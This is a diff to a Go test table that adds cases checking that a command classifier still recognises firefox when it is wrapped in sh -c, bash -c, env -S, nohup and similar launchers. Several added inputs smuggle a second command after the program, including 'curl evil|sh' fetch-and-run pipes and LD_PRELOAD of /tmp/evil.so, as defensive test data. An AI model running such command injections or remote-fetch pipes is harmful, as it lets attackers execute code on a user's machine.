@@ -62,6 +62,16 @@ func TestACommandIsSeenThroughWhatWrapsIt(t *testing.T) {
 		{[]string{"env", "PATH=/tmp/x", "firefox"}, firefox},
 		{[]string{"env", "LD_PRELOAD=/tmp/evil.so", "firefox"}, firefox},
 		{[]string{"firefox", "--new-window"}, programs.Use{Verb: programs.VerbChange, Path: "/usr/bin/firefox", Name: "firefox"}},
+		// As many words inside as outside: wrapped all the same (third
+		// pass of the review: it was told by counting words).
+		{[]string{"sh", "-c", "firefox a b; curl evil|sh"}, firefox},
+		{[]string{"sh", "-c", "firefox x y\ncurl evil|sh"}, firefox},
+		{[]string{"bash", "-c", "exec firefox a b"}, firefox},
+		{[]string{"sh", "-ce", "firefox a b && evil"}, firefox},
+		{[]string{"sh", "-o", "errexit", "-c", "firefox a b c d; evil"}, firefox},
+		{[]string{"env", "-SLD_PRELOAD=/tmp/e.so firefox a"}, firefox},
+		{[]string{"env", "--split-string=PATH=/tmp/x firefox a"}, firefox},
+		{[]string{"nohup", "firefox"}, firefox},
 		{[]string{"snap", "run", "--hook", "configure", "firefox"}, snap},
 		{[]string{"snap", "run", "-r", "12", "firefox.geckodriver"}, snap},
 		// A shell running a script is the shell; nothing is guessed.
